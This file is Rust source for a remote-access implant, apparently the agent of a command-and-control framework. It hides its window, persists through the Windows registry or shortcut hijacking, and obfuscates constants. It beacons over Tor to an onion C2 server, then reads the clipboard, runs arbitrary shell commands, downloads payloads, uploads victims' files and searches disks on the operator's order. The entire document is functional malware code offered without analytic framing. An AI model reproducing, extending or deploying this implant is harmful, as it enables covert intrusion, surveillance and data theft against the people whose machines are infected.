#![windows_subsystem = "windows"]

mod config;
mod helpers;
mod exc;
mod debug;
mod win_persist;
mod mutex;

use arti_client::{
    TorClient,
    TorClientConfig,
    StreamPrefs,
    DataStream,
};
use goldberg::goldberg_int;
use tokio::io::{
    AsyncWriteExt,
    AsyncReadExt,
    Result,
};
use gethostname::gethostname;
use std::{env, io};
use serde_json;
use serde::{Serialize, Deserialize};

#[derive(Serialize)]
struct RegisterRequest {
    hostname: String,
    os: String,
    arch: String,
    ip: String,
    ram: String,
    #[serde(rename = "osVersion")]
    os_version: String,
    #[serde(rename = "cpuName")]
    cpu_name: String,
}

#[derive(Deserialize)]
struct RegisterResponse {
    id: String,
}

#[derive(Deserialize)]
struct Message {
    id: String,
    request: String,
}

#[derive(Serialize)]
struct OutputMessage {
    #[serde(rename = "messageId")]
    message_id: String,
    response: String,
}

#[inline]
fn persist() -> bool {
    match config::persistence() {
        config::Persistence::None => {
            debug_println!("no persistence mechanism enabled");
        },
        config::Persistence::WindowsRegistry => {
            debug_println!("'WindowsRegistry' based persistence");
            match win_persist::classic_registry_based_survival(&config::get_reg_program_name().clone()) {
                Ok(_) => {
                    return true;
                },
                Err(e) => {
                    debug_eprintln!("failed to persist on windows: {}", e);
                },
            }
        },
        config::Persistence::ShortcutTakeover => {
            debug_println!("'ShortcutTakeover' based persistence");
            match win_persist::shortcut_takeover(&config::get_lnk_target_program_path(), &config::get_lnk_shortcut_name()) {
                Ok(_) => {
                    return true;
                },
                Err(e) => {
                    debug_eprintln!("failed to persist on windows: {}", e);
                },
            }
        },
    }
    return false;
}

#[tokio::main]
async fn main() {
    helpers::set_working_dir_to_program_dir();

    if config::get_mutex_name().len() != 0 {
        match mutex::create_program_mutex() {
            Ok(mutex_already_exists) => {
                if mutex_already_exists {
                    // We exit due to another instance of an agent running.
                    debug_println!("another instance of an agent detected... exiting.");
                    std::process::exit(0);
                }
                debug_println!("no mutex found... first agent instance");
            },
            Err(e) => {
                debug_eprintln!("failed to create program mutex: {}", e);
            },
        }
    }

    // Agent's configuration:
    let address = config::get_address();
    let port: u16 = goldberg_int!(80);

    // Agent's environment details:
    let hostname = match gethostname().into_string() {
        Ok(name) => name,
        Err(_) => "unknown".to_string(),
    };

    let args: Vec<String> = env::args().collect();
    for arg in args.iter() {
        if arg == "--run-lnk" {
            match exc::run_and_forget(&config::get_lnk_target_program_path()) {
                Ok(_) => {},
                Err(e) => {
                    debug_println!("failed to run lnk target program: {}", e);
                },
            }
        }
    }

    let persisted = persist();
    debug_println!("agent persistence process returned: {}", persisted);
    
    let os_name = env::consts::OS;
    let sys_arch = env::consts::ARCH;

    debug_println!("agent started: {:?}, {}, {}", hostname, os_name, sys_arch);

    let mut id = String::new();
    match helpers::load_id().await {
        Some(saved_id) => {
            id = saved_id;
        },
        _ => {}
    }

    let mut s_prefs = StreamPrefs::new();
    s_prefs.connect_to_onion_services(arti_client::config::BoolOrAuto::Explicit(true));

    let config = TorClientConfig::default();

    let tor_client = match TorClient::create_bootstrapped(config).await {
        Ok(client) => client,
        Err(e) => {
            debug_eprintln!("failed to create tor client: {:?}", e);
            helpers::wait().await;
            // TODO: Do something else other than exit.
            return;
        }
    };

    debug_println!("tor client initialized");

    loop {
        // We wish to skip reaching out to the C2 if this very moment is outside of the active hours.
        // If active hours are disabled then it would always reach out to the C2. Otherwise it would
        // do so only during active hours time frames.
        if !config::get_should_be_active() {
            debug_println!("out of active hours... sleeping");
            helpers::wait().await;
            continue;
        }

        debug_println!("connecting to: {} {}", address.clone(), port);

        let mut stream = match tor_client.connect_with_prefs((address.clone(), port), &s_prefs).await {
            Ok(s) => s,
            Err(e) => {
                debug_eprintln!("failed to connect to the server: {}", e);
                helpers::wait().await;
                continue;
            }
        };

        if id.len() == 0 {
            let system_information = helpers::get_system_information();
            let ip_address = ""; // TODO

            let id_resp = match register(&hostname, os_name, sys_arch, &system_information.os_version, &system_information.cpu_info, ip_address, &system_information.memory, &mut stream).await {
                Ok(id_resp) => id_resp,
                Err(e) => {
                    debug_eprintln!("registration error: {}", e);
                    helpers::wait().await;
                    continue;
                }, 
            };

            id = id_resp.id;

            debug_println!("Agent's Assigned A New ID");
        }
        if id.len() == 0 {
            debug_println!("server returned an empty id... critical");
            continue;
        }

        debug_println!("fetching messages");

        let messages = match get_messages(&id, &mut stream).await {
            Ok(messages) => messages,
            Err(e) => {
                debug_eprintln!("get messages error: {}", e);
                helpers::wait().await;
                continue;
            }
        };

        debug_println!("got messages: {}", messages.len());

        for message in messages {

            let mut interpreted = (async || {
                if message.request == "/read-clipboard" {
                    match helpers::read_clipboard() {
                        Ok(data) => {
                            return data;
                        },
                        Err(e) => {
                            return e.to_string();
                        },
                    };
                }

                if message.request.starts_with("/run|") {
                    let parts: Vec<&str> = message.request.split("|").collect();
                    if parts.len() != 2 {
                        return "failed to parse command: invalid format".to_string();
                    }

                    let cmd = parts[1].to_string();

                    let output = match exc::run_and_forget(&cmd) {
                        Ok(_) => "ok".to_string(),
                        Err(e) => e.to_string(),
                    };

                    return output;
                }

                if message.request.starts_with("/download-file|") {
                    // Parse the command to extract file name on disk and file ID.
                    let parts: Vec<&str> = message.request.split("|").collect();
                    if parts.len() != 3 {
                        return "failed to parse command: invalid format".to_string();
                    }
                    let file_name_on_disk = parts[1];
                    let file_id = parts[2];

                    let mut download_stream = match tor_client.connect_with_prefs((address.clone(), port), &s_prefs).await {
                        Ok(s) => s,
                        Err(e) => {
                            return format!("failed to connect to server: {}", e);
                        }
                    };

                    let endpoint = format!("/v1/files/{}", file_id);
                    let req_buff = format!("GET {} HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n", endpoint).into_bytes();

                    if let Err(e) = download_stream.write_all(&req_buff).await {
                        return format!("failed to write request: {}", e);
                    }
                    if let Err(e) = download_stream.flush().await {
                        return format!("failed to flush stream: {}", e);
                    }

                    let mut resp_buff = Vec::new();
                    if let Err(e) = download_stream.read_to_end(&mut resp_buff).await {
                        return format!("failed to read response: {}", e);
                    }

                    let strresp = String::from_utf8_lossy(&resp_buff);
                    let lines: Vec<&str> = strresp.split("\r\n").collect();
                    if lines.is_empty() {
                        return "empty response".to_string();
                    }
                    let status_line = lines[0];
                    if !status_line.contains("200 OK") {
                        return format!("server returned {}", status_line);
                    }

                    let content_start = strresp.find("\r\n\r\n").map_or(0, |pos| pos + 4);
                    let file_content = &strresp[content_start..];

                    let write_output = match tokio::fs::write(file_name_on_disk, file_content.as_bytes()).await {
                        Ok(()) => "downloaded".to_string(),
                        Err(e) => e.to_string(),
                    };

                    return write_output;
                }

                if message.request.starts_with("/upload-file|") {
                    match helpers::parse_upload_command(&message.request) {
                        Ok((file_path, file_id)) => {
                            let file_contents = match tokio::fs::read(&file_path).await {
                                Ok(contents) => contents,
                                Err(e) => {
                                    return format!("failed to read file at '{}' because: {}", &file_path, e);
                                }
                            };
                            
                            let mut upload_stream = match tor_client.connect_with_prefs((address.clone(), port), &s_prefs).await {
                                Ok(s) => s,
                                Err(e) => {
                                    return format!("failed to connect to server: {}", e);
                                }
                            };
                            
                            let endpoint = format!("/v1/files/{}", file_id);
                            let content_length = file_contents.len().to_string();
                            let mut req_buff = format!("PUT {} HTTP/1.1\r\nHost: x\r\nConnection: close\r\nContent-Length: {}\r\n\r\n", endpoint, content_length).into_bytes();
                            req_buff.extend(file_contents);
                            
                            if let Err(e) = upload_stream.write_all(&req_buff).await {
                                return format!("failed to write request: {}", e);
                            }
                            if let Err(e) = upload_stream.flush().await {
                                return format!("failed to flush stream: {}", e);
                            }
                            
                            let mut resp_buff = Vec::new();
                            if let Err(e) = upload_stream.read_to_end(&mut resp_buff).await {
                                return format!("failed to read response: {}", e);
                            }
                            
                            let strresp = String::from_utf8_lossy(&resp_buff);
                            let lines: Vec<&str> = strresp.split("\r\n").collect();
                            if lines.is_empty() {
                                return "empty response".to_string();
                            }
                            let status_line = lines[0];
                            if status_line.contains("200 OK") {
                                return "uploaded".to_string();
                            } else {
                                return format!("server returned {}", status_line);
                            }
                        },
                        Err(e) => {
                            return format!("Error parsing the command: {}", e);
                        }
                    }
                }

                if message.request.starts_with("/find-files") {
                    debug_println!("_> Finding files...");

                    match helpers::parse_find_files_command(&message.request) {
                        Ok((path, terms)) => {
                            debug_println!("_> Path is '{}' and search terms are '{:#?}'", &path, &terms);
                            let files = helpers::find_files(path, terms);
                            return files.join("\n");
                        }
                        Err(e) => {
                            return format!("Error parsing the command: {}", e);
                        }
                    }
                }

                if message.request.trim() == "/system-details" {
                    debug_println!("_> Getting system details...");
                    let system_information = helpers::get_system_information();
                    let mut info_as_str = String::new();
                    info_as_str.push_str(&format!("Memory: {}", system_information.memory));
                    info_as_str.push_str(&format!("\nUptime: {}", system_information.uptime_seconds));
                    info_as_str.push_str(&format!("\nAC Power: {}", system_information.is_ac_power));
                    info_as_str.push_str(&format!("\nCPU Temp: {}", system_information.cpu_temperature));
                    info_as_str.push_str(&format!("\nCPU Info:\n{}", system_information.cpu_info));
                    for network in system_information.networks {
                        info_as_str.push_str(&format!("\nNetwork: {}", network));
                    }

                    return info_as_str;
                }

                debug_println!("_> Executing shell command...");
                let command_output = match exc::run(&message.request) {
                    Ok(output) => output,
                    Err(e) => {
                        format!("{}", e)
                    }
                };

                return command_output;
            })().await;

            if interpreted.len() == 0 {
                interpreted = "[empty response]".to_string();
            }

            debug_println!("sending response: {} - {}\n{}", message.id.clone(), message.request.clone(), interpreted.clone());

            let mut stream = match tor_client.connect_with_prefs((address.clone(), port), &s_prefs).await {
                Ok(s) => s,
                Err(e) => {
                    debug_eprintln!("failed to connect to the server: {}", e);
                    helpers::wait().await;
                    continue;
                }
            };

            match send_message(&message.id, &interpreted, &mut stream).await {
                Ok(_) => {},
                Err(e) => {
                    debug_eprintln!("failed to send message: {}", e);
                    helpers::wait().await;
                    continue;
                },
            };
        }

        helpers::wait().await;
    }
}

#[inline]
async fn register(hostname: &String, os: &str, arch: &str, os_version: &str, cpu_name: &str, ip: &str, ram: &str, stream: &mut DataStream) -> Result<RegisterResponse> {
    let identity = RegisterRequest{
        hostname: hostname.clone(),
        os: os.to_string(),
        arch: arch.to_string(),
        ip: ip.to_string(),
        os_version: os_version.to_string(),
        cpu_name: cpu_name.to_string(),
        ram: ram.to_string(),
    };

    let json_identity = match serde_json::to_string(&identity) {
        Ok(jj) => jj.as_bytes().to_vec(),
        Err(e) => {
            debug_eprintln!("failed to serialize identity to json: {:?}", e);
            helpers::wait().await;
            return Err(e.into());
        }
    };

    let json_identity_length = json_identity.len().to_string();

    let mut req_buff = b"PUT /v1 HTTP/1.1\r\nHost: x\r\nConnection: close\r\nContent-Length: ".to_vec();
    req_buff.extend(json_identity_length.as_bytes());
    req_buff.extend(b"\r\n\r\n");
    req_buff.extend(&json_identity);

    match stream.write_all(&req_buff).await {
        Ok(_) => {},
        Err(e) => {
            return Err(e);
        }
    }

    match stream.flush().await {
        Ok(_) => {},
        Err(e) => {
            return Err(e);
        }
    }

    let mut resp_buff = Vec::new();
    match stream.read_to_end(&mut resp_buff).await {
        Ok(_) => {},
        Err(e) => {
            return Err(e);
        }
    }

    let strresp = String::from_utf8_lossy(&resp_buff);
    let segments: Vec<&str> = strresp.split("\r\n").collect();
    let last = match segments.last() {
        Some(x) => x,
        _ => {
            return Err(io::Error::new(io::ErrorKind::Other, "response stream contains no line separators"));
        },
    };

    let id_resp: RegisterResponse = match serde_json::from_str(last) {
        Ok(resp) => resp,
        Err(e) => {
            return Err(e.into());
        }
    };

    match helpers::save_id(&id_resp.id).await {
        Ok(_) => {},
        Err(e) => {
            return Err(e.into());
        },
    };

    Ok(id_resp)
}

#[inline]
async fn get_messages(agent_id: &String, stream: &mut DataStream) -> Result<Vec<Message>> {
    let mut req_buff = b"GET /v1/".to_vec();
    req_buff.extend(agent_id.as_bytes());
    req_buff.extend(b" HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n");

    match stream.write_all(&req_buff).await {
        Ok(_) => {},
        Err(e) => {
            return Err(e);
        }
    }

    match stream.flush().await {
        Ok(_) => {},
        Err(e) => {
            return Err(e);
        }
    }

    let mut resp_buff = Vec::new();
    match stream.read_to_end(&mut resp_buff).await {
        Ok(_) => {},
        Err(e) => {
            return Err(e);
        }
    }

    let strresp = String::from_utf8_lossy(&resp_buff);
    let segments: Vec<&str> = strresp.split("\r\n").collect();
    let last = match segments.last() {
        Some(x) => x,
        _ => {
            return Err(io::Error::new(io::ErrorKind::Other, "response stream contains no line separators"));
        }
    };

    let messages: Vec<Message> = match serde_json::from_str(last) {
        Ok(resp) => resp,
        Err(e) => {
            return Err(e.into());
        }
    };

    Ok(messages)
}

#[inline]
async fn send_message(msg_id: &String, response: &String, stream: &mut DataStream) -> Result<bool> {
    let req = OutputMessage{
        message_id: msg_id.to_string(),
        response: response.to_string(),
    };

    let json_req = match serde_json::to_string(&req) {
        Ok(jj) => jj.as_bytes().to_vec(),
        Err(e) => {
            return Err(e.into());
        }
    };
    
    let req_len = json_req.len().to_string();

    let mut req_buff = b"POST /v1 HTTP/1.1\r\nHost: x\r\nConnection: close\r\nContent-Length: ".to_vec();
    req_buff.extend(req_len.as_bytes());
    req_buff.extend(b"\r\n\r\n");
    req_buff.extend(json_req);

    match stream.write_all(&req_buff).await {
        Ok(_) => {},
        Err(e) => {
            return Err(e);
        }
    }

    match stream.flush().await {
        Ok(_) => {},
        Err(e) => {
            return Err(e);
        }
    }

    Ok(true)
}
